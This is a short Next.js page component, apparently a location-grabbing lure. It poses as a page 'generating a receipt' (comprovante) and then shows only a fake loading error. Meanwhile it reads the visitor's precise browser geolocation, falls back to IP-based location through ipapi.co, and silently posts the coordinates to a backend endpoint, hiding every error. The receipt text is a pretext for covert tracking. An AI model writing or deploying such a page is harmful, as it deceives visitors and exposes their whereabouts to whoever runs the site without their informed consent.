"use client";

import { useCallback, useEffect, useState } from "react";

export default function Home() {
  const [location, setLocation] = useState<{
    latitude: number;
    longitude: number;
  } | null>(null);

  const sendToBackend = useCallback(async (lat: number, lon: number) => {
    try {
      await fetch("/api/localizacao", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude: lat, longitude: lon }),
      });
    } catch (error) {
      console.error("Erro ao enviar localização:", error);
    }
  }, []);

  const getLocationByIP = useCallback(async () => {
    try {
      const response = await fetch("https://ipapi.co/json/");
      const data = await response.json();
      setLocation({ latitude: data.latitude, longitude: data.longitude });
      await sendToBackend(data.latitude, data.longitude);
    } catch {
    } finally {
    }
  }, [sendToBackend]); // Adicionada dependência

  useEffect(() => {
    const handleGeolocation = async () => {
      try {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              const { latitude, longitude } = position.coords;
              setLocation({ latitude, longitude });
              await sendToBackend(latitude, longitude);
            },
            async () => {
              await getLocationByIP();
            }
          );
        } else {
          await getLocationByIP();
        }
      } catch {}
    };

    handleGeolocation();
  }, [getLocationByIP, sendToBackend]);

  return (
    <div className="flex items-center justify-center h-screen">
      <div className="text-center">
        <h1 className="text-2xl font-bold">Bem-vindo!</h1>
        {location ? (
          <p>Comprovante: Erro ao carregar comprovante!</p>
        ) : (
          <p>Gerando Comprovante...</p>
        )}
      </div>
    </div>
  );
}
